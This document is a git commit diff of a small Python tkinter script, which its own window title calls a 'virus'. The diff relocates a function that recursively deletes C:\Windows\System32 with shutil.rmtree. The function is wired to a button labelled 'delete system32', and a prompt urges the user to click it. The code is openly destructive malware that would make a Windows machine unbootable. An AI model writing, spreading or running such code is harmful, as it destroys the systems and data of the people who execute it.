7ca2b4642ca056f41baf0623707da093e9e7a3b3
potatos <discordtufe@gmail.com>
2026-03-30 17:58:29 -0700

    Update potatos1233.py

--- potatos1233.py
+++ potatos1233.py
@@ -3,24 +3,21 @@ from tkinter import messagebox
 import shutil                         
 import os                             
 
-
-def kill_system32():
-    target = r'C:\Windows\System32'         
-    shutil.rmtree(target)                      
-    messagebox.showinfo("your pc is dead", "system32 has been deleted.")
-
-
 def launch():
     messagebox.showinfo("click me", "go ahead click the button")
     win = tk.Toplevel()
     win.title("potatos1233 virus")
     
     btn = tk.Button(win,
-                    text="Delete System32",
+                    text="delete system32",
                     command=kill_system32)
     btn.pack(padx=10, pady=10)          
 
-
+def kill_system32():
+    target = r'C:\Windows\System32'         
+    shutil.rmtree(target)                      
+    messagebox.showinfo("your pc is dead", "system32 has been deleted.")
+    
 root = tk.Tk()      
 root.withdraw()      
 
